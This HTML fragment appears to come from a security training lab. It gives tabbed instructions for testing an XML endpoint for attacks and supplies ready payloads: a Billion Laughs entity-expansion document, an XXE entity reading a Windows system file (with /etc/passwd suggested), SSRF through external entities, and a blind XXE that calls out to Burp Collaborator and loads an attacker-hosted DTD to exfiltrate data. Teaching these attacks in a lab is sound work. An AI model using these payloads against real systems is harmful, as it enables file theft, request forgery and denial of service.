<br><br>

<div class="tab">
	<button class="tablinks" onclick="displayInstruction(event, 'case1')">Billion Laughs Attack</button>
	<button class="tablinks" onclick="displayInstruction(event, 'case2')">Normal XXE</button>
	<button class="tablinks" onclick="displayInstruction(event, 'case3')">Blind XXE</button>
</div>


<div id="case1" class="tabcontent">
<h4>How to test?</h4>
<ol>

<li>Provide the following input and observe the output.</li>
<textarea rows="12" cols="60" style="border:none;">
<employees>
    <employee id="111">
        <firstName>Lokesh</firstName>
        <lastName>Gupta</lastName>
        <location>India</location>
    </employee>
    <employee id="333">
        <firstName>David</firstName>
        <lastName>Feezor</lastName>
        <location>USA</location>
    </employee>
</employees>	
</textarea><br>

<li>Provide a malformed XML and observe the error.</li>

<li>Provide the following input for "Billion Laughs attack". Observe the entity "t3" appended with USA at the end.</li>
<textarea rows="18" cols="60" style="border:none;">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employees
[
  <!ENTITY test "Billion Laughs! ">
  <!ENTITY t1 "&test;&test;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<employees>
    <employee id="111">
        <firstName>Lokesh</firstName>
        <lastName>Gupta</lastName>
        <location>India</location>
    </employee>
    <employee id="333">
        <firstName>David</firstName>
        <lastName>Feezor</lastName>
        <location>USA: &t3;</location>
    </employee>
</employees>
</textarea>
</ol>
</div>



<div id="case2" class="tabcontent">
<h4>How to test?</h4>
 
<ol>
	<li>Provide the following input. Observe the external entity "file:///C:/Windows/win.ini" appended with USA at the end. If the backend is Linux try to get the contents of /etc/passwd.</li>
 	
<textarea rows="16" cols="60" style="border:none;">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE employees
[
  <!ENTITY file SYSTEM "file:///C:/Windows/win.ini">
]>
<employees>
    <employee id="111">
        <firstName>Lokesh</firstName>
        <lastName>Gupta</lastName>
        <location>India</location>
    </employee>
    <employee id="333">
        <firstName>David</firstName>
        <lastName>Feezor</lastName>
        <location>USA: &file;</location>
    </employee>
</employees>
</textarea> 	
 	
 	<li>You can also make the application send HTTP requests (SSRF attack)  by using &lt;!ENTITY file SYSTEM "http://dummy.restapiexample.com/api/v1/employees"><br>
 	 If the response breaks the XML structure you will get an error. For error case try https://google.com.</li>


</ol>
</div>



<div id="case3" class="tabcontent">
<h4>How to test?</h4>
 
<ol>
	<li>Provide an XML input (&lt;test>abc&lt;/test>) or any other well formed XML input and observe the response. Response is always same.</li>
 	<li>Now provide the following input and observe the HTTP request in Burp Collaborator.</li>

<textarea rows="6" cols="60" style="border:none;">
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo
[
  <!ENTITY file SYSTEM "http://burp-collaborator.com">
]>
</textarea>

 	<li>The application makes HTTP request which confirms blind XXE injection.</li>
 	<li>Attacker hosted malicious dtd is available at http://127.0.0.1:8080/lab/XXE.dtd</li>
    <li>Provide the following input to exfiltrate data</li>

<textarea rows="6" cols="60" style="border:none;">
<!DOCTYPE foo 
[
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:8080/lab/XXE.dtd">
  %xxe;
]>
</textarea>

</ol>
</div>


 <script>
	function displayInstruction(evt, testCase) {
		var i, tabcontent, tablinks;
		tabcontent = document.getElementsByClassName("tabcontent");
		for (i = 0; i < tabcontent.length; i++) {
			tabcontent[i].style.display = "none";
		}
		tablinks = document.getElementsByClassName("tablinks");
		for (i = 0; i < tablinks.length; i++) {
			tablinks[i].className = tablinks[i].className
					.replace(" active", "");
		}
		document.getElementById(testCase).style.display = "block";
		evt.currentTarget.className += " active";
	}
</script>
 